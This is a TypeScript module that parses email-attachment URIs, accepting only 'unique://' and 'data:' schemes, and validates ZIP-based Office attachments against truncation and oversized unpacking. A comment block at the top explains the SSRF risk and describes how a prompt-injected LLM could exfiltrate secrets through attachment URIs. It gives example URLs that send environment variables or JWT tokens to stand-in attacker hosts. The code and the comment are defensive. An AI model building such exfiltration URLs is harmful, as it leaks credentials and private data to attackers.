import { crc32 } from 'node:zlib';
import { type Entry, fromBufferPromise, type ZipFile } from 'yauzl';

// Arbitrary external URLs are intentionally not supported.
// Fetching user-supplied URLs server-side would expose the service to SSRF attacks:
// an attacker (or a prompt-injected LLM) could target internal infrastructure
// (metadata servers, cluster-internal services, etc.) by supplying a crafted URL.
//
// Data exfiltration via attachments is another risk: a prompt-injected LLM could
// encode sensitive data (environment variables, database credentials, internal API
// responses, chat history) into the attachment URI itself — for example:
//   - `https://evil.com/collect?secret=<base64-encoded-env-vars>`
//   - `https://attacker.dev/exfil/<jwt-token-from-memory>`
//   - A `data:` URI converted to a file and sent as an email attachment containing
//     scraped internal data
// By restricting to `unique://` and `data:` schemes, outbound fetches to attacker-
// controlled servers are prevented, closing this exfiltration channel.
//
// Use `unique://` for Unique knowledge-base files or `data:` for inline content instead.
export type ParsedUri =
  | { type: 'unique'; contentId: string }
  | { type: 'data'; mimeType: string; data: Buffer };

const UNIQUE_URI_PATTERN = /^unique:\/\/content\/([^/]+)$/;
const DATA_URI_PATTERN = /^data:([^;,]*)(;base64)?,(.*)$/s;
const ZIP_FILE_SIGNATURE = Buffer.from('PK\x03\x04', 'latin1');
const MAX_UNCOMPRESSED_ATTACHMENT_SIZE = 1024 * 1024 * 1024;
const TRUNCATED_ATTACHMENT_MESSAGE = 'Attachment data is truncated and cannot be opened';

const OOXML_MIME_TYPES = new Set([
  'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  'application/vnd.openxmlformats-officedocument.presentationml.presentation',
]);

export async function parseAttachmentUri(
  uri: string,
  { maxUncompressedSize = MAX_UNCOMPRESSED_ATTACHMENT_SIZE } = {},
): Promise<ParsedUri> {
  const uniqueMatch = uri.match(UNIQUE_URI_PATTERN);
  if (uniqueMatch) {
    const contentId = uniqueMatch[1];
    return { type: 'unique', contentId: contentId ?? '' };
  }

  const dataMatch = uri.match(DATA_URI_PATTERN);
  const rawData = dataMatch?.[3];
  if (dataMatch && rawData) {
    const mimeType = dataMatch[1] || 'application/octet-stream';
    const isBase64 = dataMatch[2] === ';base64';
    const data = isBase64
      ? decodeBase64Attachment(rawData)
      : Buffer.from(decodeURIComponent(rawData));

    if (isBase64) {
      await assertZipIsReadable(mimeType, data, maxUncompressedSize);
    }

    return { type: 'data', mimeType, data };
  }

  throw new Error(`Unsupported attachment URI scheme: ${uri.slice(0, 30)}`);
}

// TypeScript 5.9 does not declare Uint8Array.fromBase64, which Node 26 provides.
interface Uint8ArrayFromBase64 extends Uint8ArrayConstructor {
  fromBase64(input: string): Uint8Array;
}

function decodeBase64Attachment(rawData: string): Buffer {
  try {
    const bytes = (Uint8Array as Uint8ArrayFromBase64).fromBase64(rawData);
    return Buffer.from(bytes);
  } catch {
    throw new Error(TRUNCATED_ATTACHMENT_MESSAGE);
  }
}

async function assertZipIsReadable(
  mimeType: string,
  data: Buffer,
  maxUncompressedSize: number,
): Promise<void> {
  const isZip = data.subarray(0, ZIP_FILE_SIGNATURE.length).equals(ZIP_FILE_SIGNATURE);
  if (OOXML_MIME_TYPES.has(mimeType.toLowerCase()) && !isZip) {
    throw new Error('Attachment is not a valid Office file and cannot be opened');
  }
  if (!isZip) {
    return;
  }

  const { zipFile, entries } = await readZipDirectory(data);
  // yauzl fails a stream that inflates past the entry's uncompressedSize, so the sum bounds the work.
  const uncompressedSize = entries.reduce((total, entry) => total + entry.uncompressedSize, 0);
  if (uncompressedSize > maxUncompressedSize) {
    throw new Error('Attachment unpacks to more data than allowed and cannot be attached');
  }

  for (const entry of entries) {
    if ((await computeEntryCrc32(zipFile, entry)) !== entry.crc32) {
      throw new Error(TRUNCATED_ATTACHMENT_MESSAGE);
    }
  }
}

async function readZipDirectory(data: Buffer): Promise<{ zipFile: ZipFile; entries: Entry[] }> {
  try {
    const zipFile = await fromBufferPromise(data, { lazyEntries: true });
    const entries: Entry[] = [];
    for await (const entry of zipFile.eachEntry()) {
      entries.push(entry);
    }
    return { zipFile, entries };
  } catch {
    throw new Error(TRUNCATED_ATTACHMENT_MESSAGE);
  }
}

async function computeEntryCrc32(zipFile: ZipFile, entry: Entry): Promise<number> {
  try {
    let checksum = 0;
    for await (const chunk of await zipFile.openReadStreamPromise(entry)) {
      checksum = crc32(chunk, checksum);
    }
    return checksum;
  } catch {
    throw new Error(TRUNCATED_ATTACHMENT_MESSAGE);
  }
}
